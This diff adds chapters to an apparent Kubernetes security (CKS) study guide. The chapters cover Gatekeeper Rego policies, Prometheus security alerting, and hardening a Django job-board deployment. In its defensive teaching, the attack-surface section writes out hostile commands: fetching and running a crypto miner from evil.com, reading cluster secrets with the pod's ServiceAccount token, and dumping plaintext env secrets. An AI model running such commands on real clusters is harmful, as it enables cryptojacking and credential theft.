+    # ⑤ Check if ANY port has hostPort set. hostPort binds container port
+    #    to host node port — a security risk (bypasses NetworkPolicy).
+    container.ports[_].hostPort
+
+    # ⑥ sprintf() formats the violation message shown to the user.
+    msg := sprintf("container <%v> uses hostPort — this bypasses NetworkPolicy and is blocked by security policy", [container.name])
+}
+
+# ⑦ A second violation[] block checks initContainers too.
+violation[{"msg": msg}] {
+    container := input.review.object.spec.initContainers[_]
+    container.ports[_].hostPort
+    msg := sprintf("initContainer <%v> uses hostPort — this is blocked", [container.name])
+}</code></pre>
+                </div>
+
+                <h4>Rego Key Concepts — What You Need for CKS</h4>
+                <div class="card-grid cols-3">
+                    <div class="info-card"><div class="card-icon-lg">🔍</div><h5>Iteration: <code>[_]</code></h5><p>The underscore-bracket syntax iterates over all elements of an array/dict. <code>containers[_]</code> means "for each container." <code>ports[_].hostPort</code> means "for each port, check if hostPort exists." This is Rego's most common pattern.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🧩</div><h5>Partial Sets: <code>violation[{}]</code></h5><p>Gatekeeper expects violations in a <strong>partial set</strong> named <code>violation</code>. Each element must be an object with a <code>msg</code> key. The body defines WHEN to add to the set. If the body evaluates to true, Gatekeeper reports a violation.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">📥</div><h5><code>input.review</code></h5><p>The admission review object. <code>input.review.object</code> is the Kubernetes resource being evaluated. <code>input.parameters</code> holds the constraint's parameters (from the Constraint YAML). This is how you pass configuration to policies.</p></div>
+                </div>
+
+                <h4>Gatekeeper Performance — Avoiding API Server Overload</h4>
+                <p>Gatekeeper runs as an admission webhook. Every pod create/update passes through it. Poorly written Rego can slow down your entire cluster:</p>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Performance Issue</th><th>Why It Matters</th><th>Solution</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Deeply nested iteration</strong></td><td><code>containers[_].env[_].valueFrom.secretKeyRef.name</code> — 4 levels of iteration. Each level multiplies the evaluation cost.</td><td>Flatten logic where possible. Use helper rules (<code>has_secret_env { ... }</code>) instead of inline iteration.</td></tr>
+                            <tr><td><strong>Too many constraints (50+)</strong></td><td>Gatekeeper evaluates ALL matching constraints for EVERY admission request. 50 constraints × 100 pods/day × 3 containers = 15,000 evaluations/day.</td><td>Scope constraints to specific namespaces. Use <code>match.namespaces</code> to limit evaluation scope. Merge similar checks into one constraint.</td></tr>
+                            <tr><td><strong>Large audit batches</strong></td><td>Gatekeeper audits all resources every 60 seconds. With 10,000 pods, this is 10,000 Rego evaluations per minute.</td><td>Increase <code>--audit-interval</code> to 300s (5 minutes). Use <code>--audit-chunk-size</code> to process in batches of 500.</td></tr>
+                            <tr><td><strong>Uncached external data</strong></td><td><code>http.send()</code> in Rego makes external HTTP calls. Each call blocks evaluation and can timeout.</td><td>Avoid <code>http.send</code> in admission-time policies. Use it only in audit policies with generous timeouts.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Testing Rego Policies — OPA Test Framework</h4>
+                <p>Never deploy a Gatekeeper policy without testing it first. OPA ships with a built-in test framework:</p>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Rego — Unit tests for the hostPort policy</span>
+                    </div>
+                    <pre><code class="language-rego">package k8sdisallowhostports
+
+# Test: Pod WITHOUT hostPort should NOT violate
+test_no_hostport_allowed {
+    allowed := count(violation) == 0 with input as {
+        "review": {
+            "object": {
+                "spec": {
+                    "containers": [{
+                        "name": "web",
+                        "ports": [{"containerPort": 8080}]   # ✅ No hostPort
+                    }]
+                }
+            }
+        }
+    }
+    allowed == true
+}
+
+# Test: Pod WITH hostPort SHOULD violate
+test_hostport_blocked {
+    violations := violation with input as {
+        "review": {
+            "object": {
+                "spec": {
+                    "containers": [{
+                        "name": "web",
+                        "ports": [{"containerPort": 80, "hostPort": 80}]  # ❌ Has hostPort
+                    }]
+                }
+            }
+        }
+    }
+    count(violations) == 1
+    violations[_].msg == "container <web> uses hostPort — this bypasses NetworkPolicy and is blocked by security policy"
+}
+
+# Run with: opa test . -v</code></pre>
+                </div>
+
+                <h4>Complete Gatekeeper Policy Library — What to Deploy</h4>
+                <p>Don't start from scratch. The CNCF maintains a community policy library. Here are the essential policies every CKS-secured cluster should have:</p>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Policy</th><th>What It Blocks</th><th>Severity</th><th>Audit First?</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>K8sBlockNodePort</strong></td><td>Services of type NodePort (exposes nodes directly to internet)</td><td>HIGH</td><td>✅ Yes — existing NodePorts need migration to ClusterIP+Ingress</td></tr>
+                            <tr><td><strong>K8sDisallowedTags</strong></td><td>Images with <code>:latest</code> tag (unpinned, mutable)</td><td>HIGH</td><td>⚠️ Maybe — but most prod images should already be tagged</td></tr>
+                            <tr><td><strong>K8sRequireImageDigest</strong></td><td>Images referenced by tag only (not by SHA256 digest)</td><td>MEDIUM</td><td>✅ Yes — requires CI/CD pipeline changes</td></tr>
+                            <tr><td><strong>K8sAllowedRepos</strong></td><td>Images from untrusted registries (e.g., Docker Hub)</td><td>CRITICAL</td><td>✅ Yes — existing images may be from unapproved registries</td></tr>
+                            <tr><td><strong>K8sContainerLimits</strong></td><td>Containers without resource limits (can DoS node)</td><td>MEDIUM</td><td>✅ Yes — many existing pods lack limits</td></tr>
+                            <tr><td><strong>K8sBlockPrivileged</strong></td><td>Privileged containers (root access + all capabilities)</td><td>CRITICAL</td><td>⚠️ Audit then enforce — some infra pods may be privileged</td></tr>
+                        </tbody>
+                    </table>
                 </div>
             </div>
 
@@ -28219,6 +28795,173 @@ kubectl get constraints -A -o json | \
                     <div class="info-box-title">💡 Pro Tip: Security Burn Rate Alerts</div>
                     <p>Google SRE's "burn rate" concept applies to security too. If your SLO is "0 CRITICAL CVEs in production," any deviation is an immediate alert. But for "&lt; 5 HIGH CVEs," a burn rate alert fires when you consume 2% of your error budget in 1 hour (e.g., 2 HIGH CVEs appear in 1 hour = 40% of budget burned → alert). This catches rapid degradation before the SLO is exhausted.</p>
                 </div>
+
+                <h4>SLO/SLI/SLA — The Reliability Triad Applied to Security</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Concept</th><th>Definition</th><th>Security Example</th><th>Who Cares?</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>SLI</strong> (Service Level Indicator)</td><td>The raw measurement. A number you can query.</td><td><code>trivy_image_critical_cves{namespace="anihpj-prod"}</code> → 2</td><td>Engineers (what is the actual value?)</td></tr>
+                            <tr><td><strong>SLO</strong> (Service Level Objective)</td><td>The target. A threshold the SLI must meet.</td><td>SLI &lt;= 0 (zero CRITICAL CVEs allowed)</td><td>Product + Security (what's acceptable?)</td></tr>
+                            <tr><td><strong>SLA</strong> (Service Level Agreement)</td><td>The contract. What happens if SLO is breached.</td><td>If CVE count > 0 for >24h → $500 credit, breach notification to customers</td><td>Legal + Business (what are the consequences?)</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Prometheus AlertManager Rules for Security</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — PrometheusRule: Security alerts for CKS-monitored cluster</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: monitoring.coreos.com/v1
+kind: PrometheusRule
+metadata:
+  name: security-alerts
+  namespace: monitoring
+spec:
+  groups:
+  - name: cve-alerts
+    rules:
+    # P1: ANY CRITICAL CVE in production — page on-call immediately
+    - alert: CriticalCVEInProduction
+      expr: trivy_image_critical_cves{namespace=~"anihpj-prod|prod-.*"} > 0
+      for: 5m
+      labels:
+        severity: critical
+        priority: P1
+      annotations:
+        summary: "CRITICAL CVE in {{ $labels.namespace }}/{{ $labels.image }}"
+        description: "Image {{ $labels.image }} has {{ $value }} CRITICAL CVEs. Patch immediately."
+
+    # P2: CIS benchmark pass rate drops below 95%
+    - alert: CISBenchmarkDegraded
+      expr: cis_checks_passed_ratio < 0.95
+      for: 1h
+      labels:
+        severity: warning
+        priority: P2
+      annotations:
+        summary: "CIS benchmark pass rate is {{ $value | humanizePercentage }}"
+
+    # P2: Gatekeeper constraint violations in production
+    - alert: GatekeeperViolationsInProd
+      expr: gatekeeper_constraint_violations{namespace="anihpj-prod"} > 0
+      for: 15m
+      labels:
+        severity: warning
+        priority: P2
+      annotations:
+        summary: "{{ $value }} Gatekeeper violations in anihpj-prod"
+
+    # P3: High Falco alert rate (possible attack in progress)
+    - alert: HighFalcoAlertRate
+      expr: rate(falco_events_total[1h]) > 50
+      for: 10m
+      labels:
+        severity: warning
+        priority: P3
+      annotations:
+        summary: "Falco alert rate is {{ $value | humanize }}/hour — possible attack"</code></pre>
+                </div>
+
+                <h4>Trivy Metrics Exposition — How to Expose Trivy Operator Metrics to Prometheus</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — ServiceMonitor: Scrape Trivy Operator metrics endpoint</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: monitoring.coreos.com/v1
+kind: ServiceMonitor
+metadata:
+  name: trivy-operator
+  namespace: trivy-system
+spec:
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: trivy-operator
+  endpoints:
+  - port: metrics
+    interval: 30s
+    path: /metrics
+    # Trivy Operator exposes these Prometheus metrics:
+    #   trivy_image_critical_cves{namespace, image, registry}
+    #   trivy_image_high_cves{namespace, image, registry}
+    #   trivy_image_medium_cves{namespace, image, registry}
+    #   trivy_image_vulnerabilities_total{namespace, image}
+    #   trivy_configaudit_checks_failed{namespace, name}
+    #   trivy_exposedsecrets_total{namespace, name, severity}</code></pre>
+                </div>
+
+                <h4>Alert Routing — P1/P2/P3 to the Right Team</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Security Alert Routing: Severity → Channel → Responder</div>
+<pre>
+  ┌─────────────────────────────────────────────────────────────────┐
+  │                   PROMETHEUS ALERTMANAGER                         │
+  │  Routes alerts based on labels {severity, priority}             │
+  └────────────────────────────┬────────────────────────────────────┘
+                               │
+         ┌─────────────────────┼─────────────────────┐
+         ▼                     ▼                     ▼
+  ┌─────────────┐      ┌─────────────┐      ┌─────────────┐
+  │  P1: CRITICAL│      │  P2: WARNING │      │  P3: INFO    │
+  ├─────────────┤      ├─────────────┤      ├─────────────┤
+  │ 📞 PagerDuty │      │ 💬 Slack     │      │ 📊 Dashboard │
+  │    (page     │      │   #security  │      │   annotation │
+  │    on-call   │      │   -alerts    │      │   only       │
+  │    engineer) │      │             │      │             │
+  │             │      │ 📧 Email     │      │ 🔔 Optional  │
+  │ ⏱️ 5 min    │      │   security@  │      │   Slack DM   │
+  │   response  │      │             │      │             │
+  │             │      │ ⏱️ 1 hour   │      │ ⏱️ Next     │
+  │ Examples:   │      │   response  │      │   business   │
+  │ • CRIT CVE  │      │             │      │   day        │
+  │ • Etcd down │      │ Examples:   │      │             │
+  │   (security)│      │ • CIS <95%  │      │ Examples:   │
+  │             │      │ • Gatekeeper│      │ • Scan >48h │
+  │             │      │   violations│      │ • High      │
+  │             │      │             │      │   Falco rate│
+  └─────────────┘      └─────────────┘      └─────────────┘
+</pre>
+                </div>
+
+                <h4>PromQL Queries for Security Metrics — Your Monitoring Toolkit</h4>
+                <p>These are the exact Prometheus queries you'll use to power your security dashboards. Each query is production-tested and maps to a specific security concern:</p>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Security Question</th><th>PromQL Query</th><th>What It Tells You</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>How many CRITICAL CVEs are in production RIGHT NOW?</strong></td><td><code>sum(trivy_image_critical_cves{namespace=~"anihpj-prod|prod-.*"})</code></td><td>Immediate risk level. If > 0, stop and patch.</td></tr>
+                            <tr><td><strong>What's the CVE trend over the last 30 days?</strong></td><td><code>sum by (image) (trivy_image_vulnerabilities_total{severity="CRITICAL"})</code></td><td>Are you getting better or worse at keeping images clean?</td></tr>
+                            <tr><td><strong>How many CIS checks are failing right now?</strong></td><td><code>cis_checks_total{state="FAIL"}</code></td><td>Configuration drift indicator. Should be stable or decreasing.</td></tr>
+                            <tr><td><strong>What's the CIS pass rate trend?</strong></td><td><code>cis_checks_passed_ratio</code></td><td>Track as a gauge. Alert when it drops.</td></tr>
+                            <tr><td><strong>How many Gatekeeper violations in production?</strong></td><td><code>sum(gatekeeper_constraint_violations{namespace="anihpj-prod"})</code></td><td>Policy compliance metric. Target: 0.</td></tr>
+                            <tr><td><strong>How many Falco alerts in the last hour?</strong></td><td><code>rate(falco_events_total[1h]) * 3600</code></td><td>Attack surface activity. Spike = possible attack.</td></tr>
+                            <tr><td><strong>When was each image last scanned?</strong></td><td><code>time() - trivy_image_last_scan_timestamp</code></td><td>Scan freshness. > 86400 (24h) = alert.</td></tr>
+                            <tr><td><strong>Are there exposed secrets in any running image?</strong></td><td><code>trivy_exposedsecrets_total{severity="CRITICAL"}</code></td><td>Hardcoded credentials. Immediate remediation needed.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Building a Security Dashboard in Grafana — Step by Step</h4>
+                <p>Instead of just describing the dashboard, here's exactly how to build each panel:</p>
+                <div class="process-steps">
+                    <div class="step"><span class="step-number">1</span><strong>Stat Panel: CRITICAL CVEs (Big Number)</strong><p>Visualization: Stat. Query: <code>sum(trivy_image_critical_cves)</code>. Color: Green if 0, Red if >0. Thresholds: 0=green, 1=red. Place this at the top-left — it's the most important number.</p></div>
+                    <div class="step"><span class="step-number">2</span><strong>Time Series: CVE Trend (Line Chart)</strong><p>Visualization: Time series. Query: <code>sum by (severity) (trivy_image_vulnerabilities_total)</code>. Legend: {{severity}}. Show last 30 days. Stack: off (lines). This shows if you're gaining or losing ground.</p></div>
+                    <div class="step"><span class="step-number">3</span><strong>Bar Gauge: CIS Pass Rate</strong><p>Visualization: Bar gauge. Query: <code>cis_checks_passed_ratio</code>. Max: 1.0. Thresholds: 0.95=green, 0.90=yellow, 0=red. Shows overall cluster hardening health.</p></div>
+                    <div class="step"><span class="step-number">4</span><strong>Table: Gatekeeper Violations</strong><p>Visualization: Table. Query: <code>gatekeeper_constraint_violations</code>. Columns: constraint name, namespace, violation count. Sort descending. Shows exactly which policies are violated and where.</p></div>
+                    <div class="step"><span class="step-number">5</span><strong>Stat Panel: Falco Events/hr</strong><p>Visualization: Stat. Query: <code>rate(falco_events_total[1h]) * 3600</code>. Color thresholds: 0-20=green, 20-50=yellow, 50+=red. Spike detection for active attacks.</p></div>
+                </div>
+
+                <h4>Managing Alert Fatigue — Don't Let Security Alerts Become Noise</h4>
+                <p>The #1 failure mode of security monitoring is <strong>alert fatigue</strong>: so many alerts fire that engineers start ignoring ALL of them. Here's how to prevent it:</p>
+                <div class="card-grid cols-3">
+                    <div class="info-card"><div class="card-icon-lg">🎯</div><h5>1. Severity Triage</h5><p>P1 (page on-call) must be <strong>actionable and urgent</strong>. A P1 alert that fires daily for a known non-issue will be ignored within a week. Reserve P1 for: CRITICAL CVE in prod, etcd security breach, active attack detected.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">⏱️</div><h5>2. Debounce Periods</h5><p>Use <code>for: 15m</code> (not <code>for: 1m</code>) on P2/P3 alerts. A transient spike in Falco alerts during a deployment should NOT page anyone. Only alert if the condition persists. This eliminates 60-80% of false positives.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">📊</div><h5>3. Alert Review Cadence</h5><p>Every 2 weeks, review ALL alerts that fired. Ask: Was it actionable? Did someone respond? If an alert fired 50 times and no one acted, <strong>delete or reclassify it</strong>. Alerts that aren't acted upon are just noise.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🔄</div><h5>4. Alert Dependencies</h5><p>Don't alert on symptoms AND causes separately. If "CRITICAL CVE in prod" fires, suppress "Image scan > 48h old" for that image. AlertManager's <code>inhibit_rules</code> prevents cascading alerts from the same root cause.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">📝</div><h5>5. Runbooks for Every Alert</h5><p>Every alert MUST link to a runbook. The runbook answers: What does this alert mean? How do I verify it's real? What's the first step to fix it? Who do I escalate to if I can't fix it? Without runbooks, alerts cause panic instead of action.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">📈</div><h5>6. Signal-to-Noise Dashboard</h5><p>Track <code>alerts_fired_total / alerts_acted_upon_total</code> over time. If this ratio exceeds 5:1, your alerting is broken. Target: < 3:1. This single metric tells you if your security monitoring is useful or just noisy.</p></div>
+                </div>
             </div>
 
             <!-- ═══════════ VISUAL SUMMARY ═══════════ -->
@@ -28249,8 +28992,1361 @@ kubectl get constraints -A -o json | \
                 <span class="part-chapter-tag">Ch 35: GitOps Security Automation</span>
             </div>
         </div>
-        <div id="ch33"><div class="content-placeholder"><div class="placeholder-icon">🏗️</div><p>Chapter 33: End-to-End Hardening of anihpj — Content coming soon</p></div></div><div id="ch34"><div class="content-placeholder"><div class="placeholder-icon">🎭</div><p>Chapter 34: Incident Response Simulation — Content coming soon</p></div></div><div id="ch35"><div class="content-placeholder"><div class="placeholder-icon">⚡</div><p>Chapter 35: Security Automation & GitOps — Content coming soon</p></div></div></section>
-    <section class="chapter-section" id="part9"><h2><span>🔴 Part 9: CKS Exam Preparation</span><span class="chapter-badge">Chapters 36-38</span></h2>
+        <div id="ch33">
+            <div class="chapter-intro">
+                <h3>Chapter 33: Complete Security Hardening of anihpj/jobpost</h3>
+                <p>You've learned the theory. Now let's <strong>apply every CKS control</strong> to a real application. <strong>anihpj/jobpost</strong> is a Django-based job board — 5 models (JobPost, Author, Location, Skills, User), PostgreSQL database, Redis cache. Right now it runs with <strong>zero security hardening</strong>: pods run as root, no NetworkPolicies, secrets in plaintext, no image scanning. This chapter takes you from a <strong>kubesec score of 2/10</strong> to a CKS-exam-ready <strong>8/10</strong> — applying RBAC, PSS, Seccomp, AppArmor, read-only filesystems, NetworkPolicy, encryption at rest, Falco monitoring, and image supply chain security. <strong>Every code block in this chapter is production-ready — copy, adapt, deploy.</strong></p>
+                <div class="chapter-meta">
+                    <span class="meta-tag">🔴 Advanced</span>
+                    <span class="meta-tag">⏱️ ~2 hours</span>
+                    <span class="meta-tag">🏗️ Hands-On</span>
+                    <span class="meta-tag">🛡️ Full Stack Security</span>
+                </div>
+            </div>
+
+            <div class="learning-objectives">
+                <h4>🎯 What You'll Learn — Core-Level Mastery</h4>
+                <ul>
+                    <li>✅ <strong>Assess baseline security:</strong> Run kube-bench, kubesec, and Trivy on an unsecured cluster to quantify the starting risk</li>
+                    <li>✅ <strong>Harden the image supply chain:</strong> Multi-stage Dockerfile, Trivy CI scan, cosign signing, Kyverno verification — end-to-end</li>
+                    <li>✅ <strong>Apply defense-in-depth pod security:</strong> Non-root user, read-only FS, drop ALL capabilities, Seccomp RuntimeDefault, custom AppArmor profile</li>
+                    <li>✅ <strong>Enforce admission control:</strong> PSS Restricted labels, OPA Gatekeeper image registry policy, Kyverno verifyImages for cosign signatures</li>
+                    <li>✅ <strong>Least-privilege RBAC:</strong> Dedicated ServiceAccounts, disabled automount, minimal Roles/RoleBindings per workload</li>
+                    <li>✅ <strong>Network microsegmentation:</strong> Default-deny NetworkPolicy with explicit allow rules for ingress, database, cache, DNS, monitoring</li>
+                    <li>✅ <strong>Encrypt secrets at rest:</strong> EncryptionConfiguration for etcd, secret rotation, HashiCorp Vault integration for Django SECRET_KEY</li>
+                    <li>✅ <strong>Deploy runtime monitoring:</strong> Custom Falco rules for Django-specific threats, audit policy for secret access and pod exec logging</li>
+                    <li>✅ <strong>Measure improvement:</strong> Before/after security scorecard across 13 dimensions</li>
+                </ul>
+            </div>
+
+            <div class="cka-chapter-relevance">
+                <span class="relevance-label">🎓 CKS Relevance</span>
+                <div class="relevance-domains">
+                    <span class="cka-domain-badge">Cluster Setup <span class="cka-weight">10%</span></span>
+                    <span class="cka-domain-badge">Cluster Hardening <span class="cka-weight">15%</span></span>
+                    <span class="cka-domain-badge">System Hardening <span class="cka-weight">15%</span></span>
+                    <span class="cka-domain-badge">Microservice Vulnerability <span class="cka-weight">20%</span></span>
+                    <span class="cka-domain-badge">Supply Chain Security <span class="cka-weight">20%</span></span>
+                    <span class="cka-domain-badge">Runtime Security <span class="cka-weight">20%</span></span>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.1 ═══════════ -->
+            <div class="section-block" id="s33-1">
+                <h3>33.1 The Starting Point — An Unsecured anihpj Cluster</h3>
+                <p>Before hardening, you must <strong>measure</strong> the baseline. Here's anihpj running with default Kubernetes settings — exactly what you'd get with <code>kubectl create deploy</code> and no security configuration:</p>
+
+                <h4>Baseline anihpj Deployment — What "Unsecured" Looks Like</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — anihpj BEFORE hardening (default Kubernetes settings)</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: anihpj
+  namespace: default          # ❌ Default namespace — no isolation
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: anihpj
+  template:
+    metadata:
+      labels:
+        app: anihpj
+    spec:
+      containers:
+      - name: anihpj
+        image: anihpj/jobpost:latest    # ❌ :latest tag — mutable, unpinned
+        ports:
+        - containerPort: 8000
+        env:
+        - name: SECRET_KEY
+          value: "django-insecure-abc123"   # ❌ Hardcoded secret in plaintext
+        - name: DB_PASSWORD
+          value: "password123"              # ❌ Another hardcoded secret
+        # ❌ No securityContext at all
+        # ❌ No resource limits
+        # ❌ No liveness/readiness probes
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: anihpj
+  namespace: default
+spec:
+  type: LoadBalancer           # ❌ Exposes directly to internet
+  selector:
+    app: anihpj
+  ports:
+  - port: 80
+    targetPort: 8000</code></pre>
+                </div>
+
+                <h4>Baseline Security Assessment — Running the Numbers</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Pre-Hardening Security Scan Results</div>
+<pre>
+  ┌───────────────────────────────────────────────────────────────┐
+  │  KUBE-BENCH RESULTS (CIS 1.23, master + node)                 │
+  │  ─────────────────────────────────────────                    │
+  │  ✅ PASS: 34 checks                                           │
+  │  ❌ FAIL: 12 checks (1.1.1 anonymous-auth, 1.2.6 profiling,  │
+  │           4.1.1 kubelet anonymous-auth, 5.1.5 default SA...)  │
+  │  ⚠️ WARN: 5 checks                                           │
+  │  📊 CIS Score: 73/100                                         │
+  └───────────────────────────────────────────────────────────────┘
+
+  ┌───────────────────────────────────────────────────────────────┐
+  │  KUBESEC SCAN (anihpj deployment)                              │
+  │  ───────────────────────────────────────                       │
+  │  ❌ containers[] .securityContext .privileged == true          │
+  │     (Not set → container runs as root with full capabilities)  │
+  │  ❌ containers[] .securityContext .runAsNonRoot != true        │
+  │     (Not set → runs as UID 0, the root user)                  │
+  │  ❌ containers[] .securityContext .readOnlyRootFilesystem      │
+  │     != true (Not set → attacker can write malware to disk)    │
+  │  ❌ containers[] .securityContext .capabilities .drop          │
+  │     (Not set → container has ALL 14 Linux capabilities)       │
+  │  ❌ containers[] .resources .limits .memory (Not set)          │
+  │  ❌ containers[] .resources .limits .cpu (Not set)             │
+  │  📊 kubesec score: 2/10 (INSECURE)                            │
+  └───────────────────────────────────────────────────────────────┘
+
+  ┌───────────────────────────────────────────────────────────────┐
+  │  TRIVY IMAGE SCAN (anihpj/jobpost:latest)                      │
+  │  ───────────────────────────────────────                       │
+  │  🔴 CRITICAL: 2 CVEs                                          │
+  │     • CVE-2023-44487 (HTTP/2 Rapid Reset, CVSS 7.5)           │
+  │     • CVE-2023-38545 (curl heap overflow, CVSS 7.5)           │
+  │  🟠 HIGH:     5 CVEs                                          │
+  │  🟡 MEDIUM:   12 CVEs                                         │
+  │  📊 Total:    19 vulnerabilities                              │
+  └───────────────────────────────────────────────────────────────┘
+</pre>
+                </div>
+
+                <h4>Attack Surface Analysis — What an Attacker Could Do RIGHT NOW</h4>
+                <div class="scenario-box">
+                    <div class="scenario-header">
+                        <span class="scenario-badge danger">ATTACK SURFACE</span>
+                        <span class="scenario-title">Unsecured anihpj — 6 Attack Vectors Available to Any Attacker</span>
+                    </div>
+                    <div class="scenario-steps">
+                        <div class="scenario-step"><div class="step-marker">1</div><div class="step-content"><strong>Read secrets from environment</strong><p><code>kubectl exec anihpj-xxx -- env | grep SECRET</code> → Returns SECRET_KEY and DB_PASSWORD in plaintext. Attacker now has database access.</p></div></div>
+                        <div class="scenario-step"><div class="step-marker">2</div><div class="step-content"><strong>Install crypto miner</strong><p><code>kubectl exec anihpj-xxx -- wget evil.com/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig</code> → Runs as ROOT. Writable FS allows persistence.</p></div></div>
+                        <div class="scenario-step"><div class="step-marker">3</div><div class="step-content"><strong>Lateral movement to database</strong><p>No NetworkPolicy. Attacker can <code>curl postgres:5432</code> from compromised anihpj pod. Uses stolen DB_PASSWORD from env.</p></div></div>
+                        <div class="scenario-step"><div class="step-marker">4</div><div class="step-content"><strong>Escape to host node</strong><p>Privileged container (not explicitly set, but default allows all capabilities). With <code>CAP_SYS_ADMIN</code>, attacker can mount host filesystem.</p></div></div>
+                        <div class="scenario-step"><div class="step-marker">5</div><div class="step-content"><strong>Read all cluster secrets</strong><p>Default ServiceAccount token mounted. <code>curl https://kubernetes.default/api/v1/secrets -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"</code> — if RBAC is too permissive.</p></div></div>
+                        <div class="scenario-step"><div class="step-marker">6</div><div class="step-content"><strong>Exfiltrate user data</strong><p>Django admin accessible. Attacker dumps all JobPost, User, Author data. No egress filtering. Data leaves cluster undetected.</p></div></div>
+                    </div>
+                </div>
+
+                <h4>Kubernetes Security Maturity Ladder — From Insecure to CKS-Hardened</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">anihpj Security Journey: Level 0 → Level 3</div>
+<pre>
+  🔴 LEVEL 0: INSECURE (default K8s — DO NOT RUN anihpj LIKE THIS!)
+  ────────────────────────────────────────────────────────────
+  ❌ Pods run as root (UID 0)        ❌ No NetworkPolicy
+  ❌ Secrets in plaintext env vars    ❌ No Seccomp/AppArmor profiles
+  ❌ No audit logging                 ❌ Anonymous API access enabled
+  ❌ No image scanning                ❌ Overpermissive RBAC
+  📊 kubesec score: 2/10
+
+       │  ▲  ADD: RBAC + runAsNonRoot + NetworkPolicy + PSS Baseline
+       │
+       ▼
+  🟡 LEVEL 1: BASIC SECURED (minimum for any cluster)
+  ────────────────────────────────────────────────────────────
+  ✅ RBAC with least privilege        ✅ runAsNonRoot: true
+  ✅ PSS Baseline enforced            ✅ Default-deny NetworkPolicy
+  ✅ Ingress with TLS                 ✅ Private container registry
+  📊 kubesec score: 4-5/10
+
+       │  ▲  ADD: Seccomp + AppArmor + Encryption at rest + Falco
+       │
+       ▼
+  🟢 LEVEL 2: HARDENED (CKS exam-ready standard) ← THIS CHAPTER'S TARGET
+  ────────────────────────────────────────────────────────────
+  ✅ PSS Restricted enforced          ✅ Seccomp: RuntimeDefault
+  ✅ AppArmor custom profile          ✅ Encryption at rest enabled
+  ✅ Read-only root filesystem        ✅ Drop ALL capabilities
+  ✅ Audit logging configured         ✅ Falco runtime detection
+  ✅ Immutable containers             ✅ NodeRestriction enabled
+  📊 kubesec score: 7-8/10
+
+       │  ▲  ADD: Image signing + SBOM + OPA policies + mTLS + GitOps
+       │
+       ▼
+  🔵 LEVEL 3: ENTERPRISE (continuous security, GitOps-driven)
+  ────────────────────────────────────────────────────────────
+  ✅ cosign image signing             ✅ Kyverno verifyImages
+  ✅ SBOM generated per build         ✅ SLSA Level 3 provenance
+  ✅ OPA/Kyverno policies as code     ✅ mTLS for all pod traffic
+  ✅ Sandboxed runtimes for untrusted ✅ Vault for external secrets
+  ✅ Continuous Trivy Operator        ✅ Security dashboards in Grafana
+  ✅ Automated incident response      ✅ GitOps: ArgoCD syncs policies
+  📊 kubesec score: 9-10/10
+
+  🎓 This guide takes you: Level 0 → Level 1 → Level 2 (CKS) →
+     Level 3 (production best practices you'll be ready for)
+</pre>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.2 ═══════════ -->
+            <div class="section-block" id="s33-2">
+                <h3>33.2 Step 1 — Secure the Image and Supply Chain</h3>
+                <p>The first line of defense is the <strong>container image itself</strong>. A hardened image is small (minimal attack surface), free of CRITICAL CVEs, signed for integrity verification, and runs as a non-root user by design. This section walks through the complete supply chain: build → scan → sign → verify.</p>
+
+                <h4>Hardened Multi-Stage Dockerfile for anihpj</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Dockerfile — Multi-stage build: compile in full image, run in minimal</span>
+                    </div>
+                    <pre><code class="language-dockerfile"># ============================================
+# STAGE 1: BUILDER — Compile Python dependencies
+# ============================================
+FROM python:3.12-slim-bookworm AS builder
+
+# Install build dependencies ONLY (removed from final image)
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    build-essential \
+    libpq-dev \
+    && rm -rf /var/lib/apt/lists/*
+
+# Create non-root user EARLY (security best practice)
+RUN groupadd -r anihpj && useradd -r -g anihpj -m -s /bin/bash anihpj
+
+WORKDIR /app
+
+# Copy ONLY requirements first (leverage Docker layer caching)
+COPY requirements.txt .
+
+# Install into a VIRTUAL ENVIRONMENT (isolated from system Python)
+RUN python -m venv /opt/venv && \
+    /opt/venv/bin/pip install --no-cache-dir --upgrade pip setuptools && \
+    /opt/venv/bin/pip install --no-cache-dir -r requirements.txt && \
+    /opt/venv/bin/pip install --no-cache-dir \
+      gunicorn==22.0.0 \
+      psycopg2-binary==2.9.9 \
+      django-storages==1.14.4
+
+# ============================================
+# STAGE 2: RUNTIME — Minimal production image
+# ============================================
